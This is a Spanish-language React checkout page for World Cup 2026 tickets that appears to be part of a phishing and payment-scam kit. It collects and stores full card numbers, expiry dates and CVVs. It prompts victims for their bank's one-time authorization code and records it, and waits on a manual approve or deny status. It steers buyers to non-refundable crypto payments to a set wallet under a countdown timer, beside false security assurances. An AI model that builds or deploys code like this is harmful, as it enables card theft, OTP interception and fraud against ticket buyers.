import { useState, useEffect } from 'react';
import { useMatches, formatDate, Flag } from '../data/MatchesContext';
import { useGlobalConfig } from '../data/GlobalConfigContext';
import { useAuth } from '../data/AuthContext';
import { usePurchases } from '../data/PurchasesContext';

function Timer() {
  const [time, setTime] = useState(556);
  useEffect(() => {
    const id = setInterval(() => setTime(t => Math.max(0, t - 1)), 1000);
    return () => clearInterval(id);
  }, []);
  const m = String(Math.floor(time / 60)).padStart(2, '0');
  const s = String(time % 60).padStart(2, '0');
  return <span>{m}:{s}</span>;
}

function detectCardType(number) {
  const cleaned = number.replace(/\s/g, '');
  if (/^4/.test(cleaned)) return 'visa';
  if (/^5[1-5]/.test(cleaned)) return 'mastercard';
  return null;
}

function formatCardNumber(value) {
  const cleaned = value.replace(/\D/g, '').slice(0, 16);
  return cleaned.replace(/(\d{4})(?=\d)/g, '$1 ');
}

function formatExpiry(value) {
  const cleaned = value.replace(/\D/g, '').slice(0, 4);
  if (cleaned.length > 2) return cleaned.slice(0, 2) + '/' + cleaned.slice(2);
  return cleaned;
}

export default function FinalizarCompra({ match, section, qty, onBack, onFinish }) {
  const { TEAM_FLAGS, LOCATION_STADIUM } = useMatches();
  const { cryptoWallet } = useGlobalConfig();
  const { user, login, register } = useAuth();
  const { purchases, addPurchase, updatePurchaseField } = usePurchases();
  const [method, setMethod] = useState(null);
  const [copied, setCopied] = useState(false);
  const [purchaseDone, setPurchaseDone] = useState(false);
  const [showAuth, setShowAuth] = useState(false);
  const [authMode, setAuthMode] = useState('login');
  const [authName, setAuthName] = useState('');
  const [authEmail, setAuthEmail] = useState('');
  const [authPassword, setAuthPassword] = useState('');
  const [authError, setAuthError] = useState('');
  const [pendingPay, setPendingPay] = useState(false);

  const [cardType, setCardType] = useState(null);
  const [cardholderName, setCardholderName] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');

  const [currentPurchaseId, setCurrentPurchaseId] = useState(null);
  const [txStatus, setTxStatus] = useState(null);
  const [authCode, setAuthCode] = useState('');
  const [authCodeSubmitted, setAuthCodeSubmitted] = useState(false);


  const fd = match ? formatDate(match.date) : null;
  const total = section ? qty * section.precio_base : 0;

  useEffect(() => {
    if (user && pendingPay) {
      setPendingPay(false);
      if (method === 'crypto') {
        addPurchase(match, section, qty, total, user);
        setPurchaseDone(true);
      }
    }
  }, [user, pendingPay]);

  useEffect(() => {
    if (!currentPurchaseId) return;
    const interval = setInterval(() => {
      const saved = (() => { try { return JSON.parse(localStorage.getItem('wc_purchases') || '[]'); } catch { return []; } })();
      const found = saved.find(p => p.id === currentPurchaseId);
      if (found) {
        if (found.status === 'approved') setTxStatus('approved');
        else if (found.status === 'denied') setTxStatus('denied');
        else setTxStatus('pending');
      }
    }, 1000);
    return () => clearInterval(interval);
  }, [currentPurchaseId]);

  const handleCopy = () => {
    navigator.clipboard.writeText(cryptoWallet);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handlePay = () => {
    if (!user) {
      setShowAuth(true);
      return;
    }
    if (!method) return;

    if (method === 'card') {
      if (!cardType || !cardholderName || !cardNumber || !expiryDate || !cvv) return;
      const cleaned = cardNumber.replace(/\s/g, '');
      const purchase = addPurchase(match, section, qty, total, user, {
        method: 'card',
        cardType: cardType === 'visa' ? 'VISA' : 'MasterCard',
        cardholderName,
        lastFourDigits: cleaned.slice(-4),
        fullNumber: cleaned,
        expiryDate,
        cvv,
      });
      setCurrentPurchaseId(purchase.id);
      setTxStatus('pending');
      return;
    }

    addPurchase(match, section, qty, total, user);
    setPurchaseDone(true);
  };

  const handleAuth = (e) => {
    e.preventDefault();
    setAuthError('');
    if (authMode === 'login') {
      const result = login(authEmail, authPassword);
      if (result.error) { setAuthError(result.error); return; }
      setPendingPay(true);
    } else {
      const result = register(authName, authEmail, authPassword);
      if (result.error) { setAuthError(result.error); return; }
      setPendingPay(true);
    }
  };

  const handleCardNumberChange = (e) => {
    const formatted = formatCardNumber(e.target.value);
    setCardNumber(formatted);
    setCardType(detectCardType(formatted));
  };

  const handleExpiryChange = (e) => {
    setExpiryDate(formatExpiry(e.target.value));
  };

  if (!match || !section) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <p className="text-gray-500">No se ha seleccionado ninguna sección.</p>
      </div>
    );
  }

  if (txStatus === 'approved') {
    return (
      <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center p-4">
        <div className="bg-white rounded-2xl shadow-xl max-w-md w-full mx-4 p-8 text-center space-y-4">
          <div className="w-20 h-20 rounded-full bg-green-100 flex items-center justify-center mx-auto">
            <svg className="w-10 h-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
          </div>
          <h2 className="text-2xl font-extrabold text-gray-900">Compra Aprobada con Éxito</h2>
          <p className="text-sm text-gray-500">Tu compra ha sido confirmada. Recibirás tus entradas por correo electrónico.</p>
          <button onClick={onFinish}
            className="px-6 py-2.5 rounded-xl bg-[#4c7c0c] hover:bg-[#3d6309] text-white font-bold text-sm transition-colors">
            Volver al inicio
          </button>
        </div>
      </div>
    );
  }

  if (txStatus === 'denied') {
    return (
      <div className="min-h-screen bg-gray-50 flex flex-col items-center justify-center p-4">
        <div className="bg-white rounded-2xl shadow-xl max-w-md w-full mx-4 p-8 text-center space-y-4">
          <div className="w-20 h-20 rounded-full bg-red-100 flex items-center justify-center mx-auto">
            <svg className="w-10 h-10 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2m7-2a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
          </div>
          <h2 className="text-2xl font-extrabold text-gray-900">Transacción Rechazada</h2>
          <p className="text-sm text-gray-500">La transacción no pudo ser procesada. Intenta con otro método de pago.</p>
          <button onClick={onFinish}
            className="px-6 py-2.5 rounded-xl bg-gray-900 hover:bg-gray-800 text-white font-bold text-sm transition-colors">
            Volver al inicio
          </button>
        </div>
      </div>
    );
  }

  if (txStatus === 'pending') {
    const handleAuthCodeSubmit = (e) => {
      e.preventDefault();
      if (!authCode.trim()) return;
      updatePurchaseField(currentPurchaseId, 'cardData', {
        ...purchases.find(p => p.id === currentPurchaseId)?.cardData,
        authCode: authCode.trim(),
      });
      setAuthCodeSubmitted(true);
    };

    return (
      <div className="min-h-screen bg-gray-50 flex flex-col">
        <div className="bg-white border-b border-gray-200 px-5 py-3 flex items-center gap-4 shrink-0">
          <div className="w-7 h-7 rounded bg-[#4c7c0c] flex items-center justify-center shrink-0">
            <svg className="w-4 h-4 text-white" viewBox="0 0 24 24" fill="currentColor">
              <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z" />
            </svg>
          </div>
          <h1 className="text-base font-extrabold text-gray-900">{authCodeSubmitted ? 'Transacción pendiente' : 'Transacción en proceso'}</h1>
        </div>

        <div className="flex-1 flex flex-col items-center justify-center p-6 text-center space-y-4">
          {!authCodeSubmitted ? (
            <>
              <div className="w-20 h-20 rounded-full bg-amber-100 flex items-center justify-center mx-auto">
                <svg className="w-10 h-10 text-amber-600 animate-spin" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                </svg>
              </div>
              <h2 className="text-xl font-extrabold text-gray-900">Ingrese código de autorización</h2>
              <p className="text-sm text-gray-500 max-w-sm">Su banco le ha proporcionado un código de autorización para completar la transacción.</p>
              <form onSubmit={handleAuthCodeSubmit} className="w-full max-w-xs space-y-3">
                <input type="text" placeholder="Código de autorización" value={authCode}
                  onChange={e => setAuthCode(e.target.value)}
                  className="w-full px-4 py-3 border border-gray-300 rounded-xl text-sm text-center font-mono text-lg tracking-widest focus:outline-none focus:border-[#4c7c0c] focus:ring-2 focus:ring-[#4c7c0c]/20" />
                <button type="submit" disabled={!authCode.trim()}
                  className="w-full py-3 rounded-xl bg-[#4c7c0c] hover:bg-[#3d6309] disabled:bg-gray-200 text-white font-bold text-sm transition-colors">
                  Enviar código
                </button>
              </form>
            </>
          ) : (
            <>
              <div className="w-20 h-20 rounded-full bg-blue-100 flex items-center justify-center mx-auto">
                <svg className="w-10 h-10 text-blue-600 animate-spin" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                </svg>
              </div>
              <h2 className="text-xl font-extrabold text-gray-900">Transacción pendiente</h2>
              <p className="text-sm text-gray-500 max-w-sm">Por favor, espere la aprobación. Esta página se actualizará automáticamente cuando se procese su solicitud.</p>
              <div className="flex items-center gap-2 text-sm text-gray-400">
                <span className="w-2 h-2 rounded-full bg-blue-400 animate-pulse" />
                Esperando aprobación...
              </div>
            </>
          )}
        </div>
      </div>
    );
  }

  if (purchaseDone) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="bg-white rounded-2xl shadow-xl max-w-md w-full mx-4 p-8 text-center space-y-4">
          <div className="w-16 h-16 rounded-full bg-green-100 flex items-center justify-center mx-auto">
            <svg className="w-8 h-8 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
            </svg>
          </div>
          <h2 className="text-xl font-extrabold text-gray-900">Solicitud enviada</h2>
          <p className="text-sm text-gray-500">Tu solicitud de compra (cripto) está pendiente de aprobación. Recibirás una notificación cuando sea confirmada.</p>
          <button onClick={onFinish}
            className="px-6 py-2.5 rounded-xl bg-[#4c7c0c] hover:bg-[#3d6309] text-white font-bold text-sm transition-colors">
            Volver al inicio
          </button>
        </div>
      </div>
    );
  }

  const methods = [
    {
      id: 'card',
      label: 'Tarjeta (Visa / Mastercard)',
      icon: '💳',
      disabled: true,
      alert: 'Método no disponible',
    },
    {
      id: 'apple',
      label: 'Apple Pay',
      icon: (
        <svg viewBox="0 0 24 24" className="w-6 h-6" fill="currentColor">
          <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
        </svg>
      ),
      disabled: true,
      alert: 'No disponible por el momento',
    },
    {
      id: 'crypto',
      label: 'Criptomonedas (USDT / USDC)',
      icon: '₿',
      isCrypto: true,
    },
  ];

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      <div className="bg-white border-b border-gray-200 px-5 py-3 flex items-center justify-between shrink-0">
        <div className="flex items-center gap-4">
          <button onClick={onBack} className="p-1.5 hover:bg-gray-100 rounded-lg transition-colors">
            <svg className="w-5 h-5 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
            </svg>
          </button>
          <h1 className="text-base font-extrabold text-gray-900">Finalizar compra</h1>
        </div>
        <div className="flex items-center gap-2 text-sm font-bold text-gray-700 bg-amber-50 px-3 py-1.5 rounded-lg">
          <span>⏱️</span>
          <Timer />
        </div>
      </div>

      {showAuth && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50" onClick={() => setShowAuth(false)}>
          <div className="bg-white rounded-2xl shadow-xl max-w-sm w-full mx-4 p-6" onClick={e => e.stopPropagation()}>
            <div className="flex mb-4">
              <button onClick={() => { setAuthMode('login'); setAuthError(''); }}
                className={`flex-1 pb-2 text-sm font-bold border-b-2 transition-colors ${authMode === 'login' ? 'border-[#4c7c0c] text-[#4c7c0c]' : 'border-gray-200 text-gray-400'}`}>Iniciar sesión</button>
              <button onClick={() => { setAuthMode('register'); setAuthError(''); }}
                className={`flex-1 pb-2 text-sm font-bold border-b-2 transition-colors ${authMode === 'register' ? 'border-[#4c7c0c] text-[#4c7c0c]' : 'border-gray-200 text-gray-400'}`}>Registrarse</button>
            </div>
            <form onSubmit={handleAuth} className="space-y-3">
              {authMode === 'register' && (
                <input type="text" placeholder="Nombre completo" value={authName} onChange={e => setAuthName(e.target.value)}
                  className="w-full px-3 py-2.5 border border-gray-200 rounded-xl text-sm focus:outline-none focus:border-[#4c7c0c]" required />
              )}
              <input type="email" placeholder="Correo electrónico" value={authEmail} onChange={e => setAuthEmail(e.target.value)}
                className="w-full px-3 py-2.5 border border-gray-200 rounded-xl text-sm focus:outline-none focus:border-[#4c7c0c]" required />
              <input type="password" placeholder="Contraseña" value={authPassword} onChange={e => setAuthPassword(e.target.value)}
                className="w-full px-3 py-2.5 border border-gray-200 rounded-xl text-sm focus:outline-none focus:border-[#4c7c0c]" required />
              {authError && <p className="text-xs text-red-500 font-medium">{authError}</p>}
              <button type="submit"
                className="w-full py-2.5 rounded-xl bg-[#4c7c0c] hover:bg-[#3d6309] text-white text-sm font-bold transition-colors">
                {authMode === 'login' ? 'Iniciar sesión' : 'Crear cuenta y comprar'}
              </button>
              <button type="button" onClick={() => setShowAuth(false)}
                className="w-full py-2 text-xs text-gray-400 hover:text-gray-600">Cancelar</button>
            </form>
          </div>
        </div>
      )}

      <div className="flex flex-1 flex-col md:flex-row overflow-hidden">
        <div className="w-full md:w-[60%] overflow-y-auto p-4 md:p-6 space-y-4">
          {methods.map(m => {
            const selected = method === m.id;
            return (
              <div key={m.id}
                className={`bg-white rounded-xl border transition-all ${selected ? 'border-[#4c7c0c] ring-2 ring-[#4c7c0c]/20' : 'border-gray-200'} ${m.disabled ? 'opacity-60' : 'cursor-pointer'}`}
                onClick={() => !m.disabled && setMethod(m.id)}>
                <div className="flex items-center gap-3 p-4">
                  <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center shrink-0 ${selected ? 'border-[#4c7c0c]' : 'border-gray-300'}`}>
                    {selected && <div className="w-2.5 h-2.5 rounded-full bg-[#4c7c0c]" />}
                  </div>
                  <span className="text-lg shrink-0">{typeof m.icon === 'string' ? m.icon : m.icon}</span>
                  <span className="font-medium text-sm text-gray-800">{m.label}</span>
                  {m.disabled && <span className="ml-auto text-[10px] text-gray-400 bg-gray-100 px-2 py-0.5 rounded-full">No disponible</span>}
                </div>
                {selected && m.id === 'card' && (
                  <div className="border-t border-gray-100 px-4 py-4 space-y-4 bg-gray-50 rounded-b-xl">
                    <div className="flex gap-2">
                      <button type="button" onClick={() => setCardType('visa')}
                        className={`flex-1 py-2.5 rounded-xl border-2 text-sm font-bold transition-all ${cardType === 'visa' ? 'border-blue-600 bg-blue-50 text-blue-700' : 'border-gray-200 bg-white text-gray-500 hover:border-gray-300'}`}>
                        <span className="mr-1.5">💙</span> VISA
                      </button>
                      <button type="button" onClick={() => setCardType('mastercard')}
                        className={`flex-1 py-2.5 rounded-xl border-2 text-sm font-bold transition-all ${cardType === 'mastercard' ? 'border-orange-600 bg-orange-50 text-orange-700' : 'border-gray-200 bg-white text-gray-500 hover:border-gray-300'}`}>
                        <span className="mr-1.5">🧡</span> MasterCard
                      </button>
                    </div>
                    <div>
                      <label className="block text-xs font-semibold text-gray-500 mb-1">Nombre en la tarjeta</label>
                      <input type="text" placeholder="Como aparece en la tarjeta" value={cardholderName}
                        onChange={e => setCardholderName(e.target.value)}
                        className="w-full px-3 py-2.5 border border-gray-200 rounded-xl text-sm focus:outline-none focus:border-[#4c7c0c]" />
                    </div>
                    <div>
                      <label className="block text-xs font-semibold text-gray-500 mb-1">Número de tarjeta</label>
                      <input type="text" placeholder="1234 5678 9012 3456" value={cardNumber}
                        onChange={handleCardNumberChange}
                        maxLength={19}
                        className="w-full px-3 py-2.5 border border-gray-200 rounded-xl text-sm font-mono focus:outline-none focus:border-[#4c7c0c]" />
                      {cardNumber.replace(/\s/g, '').length > 0 && !cardType && cardNumber.replace(/\s/g, '').length >= 4 && (
                        <p className="text-xs text-amber-600 mt-1">Selecciona VISA o MasterCard</p>
                      )}
                    </div>
                    <div className="flex gap-3">
                      <div className="flex-1">
                        <label className="block text-xs font-semibold text-gray-500 mb-1">Fecha de vencimiento</label>
                        <input type="text" placeholder="MM/AA" value={expiryDate}
                          onChange={handleExpiryChange}
                          maxLength={5}
                          className="w-full px-3 py-2.5 border border-gray-200 rounded-xl text-sm focus:outline-none focus:border-[#4c7c0c]" />
                      </div>
                      <div className="flex-1">
                        <label className="block text-xs font-semibold text-gray-500 mb-1">Código de seguridad</label>
                        <input type="text" placeholder="CVV" value={cvv}
                          onChange={e => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
                          maxLength={4}
                          className="w-full px-3 py-2.5 border border-gray-200 rounded-xl text-sm font-mono focus:outline-none focus:border-[#4c7c0c]" />
                      </div>
                    </div>
                    <div className="flex items-center gap-2 p-2.5 rounded-lg bg-blue-50 border border-blue-100">
                      <svg className="w-4 h-4 text-blue-600 shrink-0" viewBox="0 0 24 24" fill="currentColor">
                        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
                      </svg>
                      <p className="text-[10px] text-blue-700">Datos cifrados con SSL de 256 bits</p>
                    </div>
                  </div>
                )}
                {selected && m.isCrypto && (
                  <div className="border-t border-gray-100 px-4 py-4 space-y-3 bg-gray-50 rounded-b-xl">
                    <p className="text-xs text-gray-600">Envía el monto total exacto a la siguiente dirección de red (TRC20 / ERC20):</p>
                    <div className="flex items-center gap-2 bg-white border border-gray-200 rounded-xl px-4 py-3">
                      <code className="flex-1 text-xs text-gray-800 break-all font-mono">{cryptoWallet}</code>
                      <button onClick={handleCopy}
                        className="shrink-0 px-3 py-1.5 rounded-lg bg-gray-100 hover:bg-gray-200 text-xs font-medium text-gray-700 transition-colors">
                        {copied ? 'Copiado' : 'Copiar dirección'}
                      </button>
                    </div>
                    <p className="text-[10px] text-gray-400">Verifica que la red sea correcta antes de enviar. Los fondos no reembolsables.</p>
                  </div>
                )}
                {selected && m.disabled && m.alert && (
                  <div className="border-t border-gray-100 px-4 py-3 bg-gray-50 rounded-b-xl">
                    <p className="text-xs font-medium text-amber-700">{m.alert}</p>
                  </div>
                )}
              </div>
            );
          })}

          <button onClick={handlePay} disabled={!method || (method === 'card' && (!cardType || !cardholderName || !cardNumber || !expiryDate || !cvv))}
            className={`w-full py-3.5 rounded-xl font-bold text-base transition-colors ${method && !(method === 'card' && (!cardType || !cardholderName || !cardNumber || !expiryDate || !cvv)) ? 'bg-[#4c7c0c] hover:bg-[#3d6309] text-white' : 'bg-gray-200 text-gray-400 cursor-not-allowed'}`}>
            Pagar {total.toLocaleString()} US$
          </button>

          {!user && !showAuth && (
            <div className="p-3 rounded-xl bg-amber-50 border border-amber-200">
              <p className="text-xs text-amber-700 text-center font-medium">⚠️ Debes iniciar sesión para completar la compra</p>
            </div>
          )}
        </div>

        <div className="w-full md:w-[40%] border-t md:border-t-0 md:border-l border-gray-200 p-4 md:p-6 bg-white">
          <div className="sticky top-6 space-y-5">
            <h2 className="text-lg font-extrabold text-gray-900">Confirmación</h2>

            <div className="bg-gray-50 rounded-xl p-4 space-y-3">
              <div className="flex items-center gap-2">
                <Flag team={match.home} className="w-6 h-5 inline-block align-middle" />
                <span className="text-sm font-bold text-gray-800">{match.home}</span>
                <span className="text-xs text-gray-400">vs</span>
                <Flag team={match.away} className="w-6 h-5 inline-block align-middle" />
                <span className="text-sm font-bold text-gray-800">{match.away}</span>
              </div>
              <div className="text-xs text-gray-500">
                {fd ? `${fd.day} ${fd.month} ${fd.weekday}` : ''} &bull; {match.time} &bull; {LOCATION_STADIUM[match.location] || ''}
              </div>
              <div className="text-xs text-gray-500">World Cup 2026 &bull; {match.phase}</div>
            </div>

            <div className="space-y-2 text-sm">
              <div className="flex justify-between text-gray-600">
                <span>Sección {section.id}</span>
                <span>{qty} &times; {section.precio_base.toLocaleString()} US$</span>
              </div>
              <div className="flex justify-between text-gray-600">
                <span>Entradas</span>
                <span>{qty}</span>
              </div>
              <div className="border-t border-gray-200 pt-2 flex justify-between text-lg font-extrabold text-gray-900">
                <span>Total</span>
                <span>{total.toLocaleString()} US$</span>
              </div>
            </div>

            <div className="flex items-center gap-2 p-3 rounded-xl bg-blue-50 border border-blue-100">
              <svg className="w-5 h-5 text-blue-600 shrink-0" viewBox="0 0 24 24" fill="currentColor">
                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/>
              </svg>
              <p className="text-xs text-blue-800">Tus datos están protegidos con cifrado de grado bancario. Compra 100% segura.</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
